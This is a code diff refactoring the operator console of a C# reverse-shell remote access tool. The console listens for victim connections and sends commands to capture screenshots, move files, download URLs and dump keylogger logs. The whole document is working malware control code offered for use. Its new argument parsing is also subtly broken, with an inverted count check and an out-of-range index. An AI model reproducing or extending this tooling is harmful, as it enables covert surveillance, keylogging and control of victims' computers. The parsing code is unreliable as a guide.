@@ -1,9 +1,13 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using Commands;
+using Shared;
 
 namespace ReverseShellClient
 {
@@ -66,7 +70,7 @@ namespace ReverseShellClient
             tcpListener.Start();
 
             Console.Clear();
-            ConsoleColorTools.WriteCommandMessage("Listening on port " + port + " ...");
+            ColorTools.WriteCommandMessage("Listening on port " + port + " ...");
             // Wait for an incoming connection
             socketForServer = tcpListener.AcceptSocket();
             connected = true;
@@ -89,7 +93,7 @@ namespace ReverseShellClient
 
             tools = new ClientTools(binaryWriter, binaryReader, streamWriter, streamReader);
 
-            ConsoleColorTools.WriteCommandMessage("Connected to " + (IPEndPoint)socketForServer.RemoteEndPoint + "\n");
+            ColorTools.WriteCommandMessage("Connected to " + (IPEndPoint)socketForServer.RemoteEndPoint + "\n");
 
             tools.SayHello();
 
@@ -101,46 +105,27 @@ namespace ReverseShellClient
                 {
                     strInput.Append(streamReader.ReadLine());
 
-                    switch (strInput.ToString())
+                    var command = CommandsManager.GetCommandByFlag(strInput.ToString());
+                    if (command != null)
                     {
-                        case "{Screenshot:init}":
-                            tools.ReceiveScreenShot();
-                            break;
-                        case "{UrlDownload:init}":
-                            tools.WaitForServerToFinishFileDownload();
-                            break;
-                        case "{ReceiveFileFromClient:init}":
-                            tools.UploadFile(toolsFilePath);
-                            break;
-                        case "{UploadFileToClient:init}":
-                            tools.DownloadFile(toolsFilePath);
-                            break;
-                        case "{Keylogger:status}":
-                            tools.GetKeyloggerStatus();
-                            break;
-                        case "{Keylogger:dump}":
-                            tools.DumpKeyloggerLogs();
-                            break;
-                        default:
-                            // Normal output (text)
-                            // Check if the line isn't the one representing the path in the cmd
-                            if (!(strInput[strInput.Length - 1] == '>' && strInput.ToString().Contains(@":\")))
-                            {
-                                // Add line return
-                                strInput.Append("\r\n");
-                            }
-
-                            // Display received data
-                            Console.Write(strInput.ToString());
-                            break;
-                    }
-
-                    if (processingCommand)
-                    {
+                        // Call client method
+                        command.ClientMethod(null);
                         processingCommand = false;
                     }
+                    else
+                    {
+                        // Normal output (text)
+                        // Check if the line isn't the one representing the path in the cmd
+                        if (!(strInput[strInput.Length - 1] == '>' && strInput.ToString().Contains(@":\")))
+                        {
+                            // Add line return
+                            strInput.Append("\r\n");
+                        }
 
-
+                        // Display received data
+                        Console.Write(strInput.ToString());
+                    }
+                    
                     strInput.Remove(0, strInput.Length);
                 }
                 catch (Exception)
@@ -154,22 +139,20 @@ namespace ReverseShellClient
 
         void ProcessInput()
         {
-            // TODO : refactor this function and preprocesscommand for cleaner approach :: list of objects 
-            // TODO : -> name of command, arguments, incorporated analysis method for args, delegate for method to call, bool for blocking or not
             while (true)
             {
+                // If not allowed to send commands, continue
+                if (processingCommand)
+                {
+                    continue;
+                }
+
                 var command = Console.ReadLine();
 
                 // If the connection was closed, break from the loop
                 if (!connected)
                 {
                     break;
-                }
-
-                // If not allowed to send commands, continue to next turn
-                if (processingCommand)
-                {
-                    continue;
                 }
 
 
@@ -185,89 +168,76 @@ namespace ReverseShellClient
                 }
                 else
                 {
-                    var result = PreProcessCommand(ref command);
-                    if (result == "ok")
-                    {
-                        // Send command
-                        streamWriter.WriteLine(command);
-                        streamWriter.Flush();
-                    }
-                    else if (result == "syntaxError")
-                    {
-                        ConsoleColorTools.WriteError("Syntax error");
-                    }
-                    else if (result == "fileError")
-                    {
-                        ConsoleColorTools.WriteCommandError("The specified file doesn't exist");
-                    }
-                }
-            }
-        }
+                    var splittedCommand = command.Split(' ').ToList();
+                    var commandName = splittedCommand[0];
+                    var arguments = new List<string>();
 
-
-        string PreProcessCommand(ref string command)
-        {
-            var result = "ok";
-            var commandPart = command.Split(' ')[0];
-
-            if (command == "ls")
-            {
-                command = "dir";
-            }
-            else if (commandPart == "screenshot" || commandPart == "downloadurl" || commandPart == "upload" || commandPart == "download" || commandPart == "lcd" || commandPart == "lcwd" || commandPart == "lls" || commandPart == "keylogger")
-            {
-                if (commandPart != "screenshot")
-                {
-                    if (command.Split(' ').Length == 2)
+                    if (splittedCommand.Count == 1)
                     {
-                        var argumentPart = command.Split(' ')[1];
-                        if (commandPart == "upload" || commandPart == "download")
-                        {
-                            // Local file exists for upload ?
-                            if (commandPart == "upload" && !File.Exists(argumentPart))
+                        arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
+                    }
+
+                    var commandClass = CommandsManager.GetCommandByName(commandName);
+                    if (commandClass != null)
+                    {
+                        if (command.Contains("help")){
+                            // Help commands section
+                            if (arguments.Count == 1 && arguments[1] == "help")
                             {
-                                result = "fileError";
+                                CommandsManager.ShowCommandHelp(commandClass);
                             }
                             else
                             {
-                                toolsFilePath = argumentPart;
+                                CommandsManager.ShowGlobalHelp();
                             }
-                        }
-                        else if (commandPart == "lcd")
-                        {
-                            tools.lcd(argumentPart);
-                            result = "localCommand";
-                        }
-                    }
-                    else if (commandPart == "lcwd")
-                    {
-                        tools.lcwd();
-                        result = "localCommand";
-                    }
-                    else if (commandPart == "lls")
-                    {
-                        tools.lls();
-                        result = "localCommand";
-                    }
-                    else
-                    {
-                        result = "syntaxError";
-                    }
-                }
 
-                if (result == "ok")
-                {
-                    // Will have to wait for the process to finish in order to issue commands again
-                    processingCommand = true;
-                }
-                else
-                {
-                    // Just display the cmd path
-                    tools.SayHello();
+                            tools.SayHello();
+                            continue;
+                        }
+
+
+                        if (!CommandsManager.CheckCommandSyntax(commandClass, arguments))
+                        {
+                            ColorTools.WriteCommandError($"Syntax error, check out the command's help page ({commandName} help)");
+                            continue;
+                        }
+
+
+                        var preProcessResult = true;
+                        try
+                        {
+                            preProcessResult = commandClass.PreProcessCommand(arguments);
+                        }
+                        catch (NotImplementedException)
+                        {
+                            // Ignored
+                        }
+
+                        if (!preProcessResult)
+                        {
+                            // Error in the PreProcess method
+                            tools.SayHello();
+                            continue;
+                        }
+
+
+                        if (commandClass.isLocal)
+                        {
+                            commandClass.ClientMethod(arguments);
+                            tools.SayHello();
+                            continue;
+                        }
+                        
+
+                        // Will have to wait for the process to finish in order to issue commands again
+                        processingCommand = true;
+                    }
+
+                    // Send the data to the server
+                    streamWriter.WriteLine(command);
+                    streamWriter.Flush();
                 }
             }
-
-            return result;
         }
 
 
@@ -283,7 +253,7 @@ namespace ReverseShellClient
 
         void Cleanup()
         {
-            ConsoleColorTools.WriteWarning(processingCommand ? "\nDisconnected, operation stopped [ENTER]" : "\nDisconnected [ENTER]");
+            ColorTools.WriteWarning(processingCommand ? "\nDisconnected, operation stopped [ENTER]" : "\nDisconnected [ENTER]");
 
             connected = false;
 
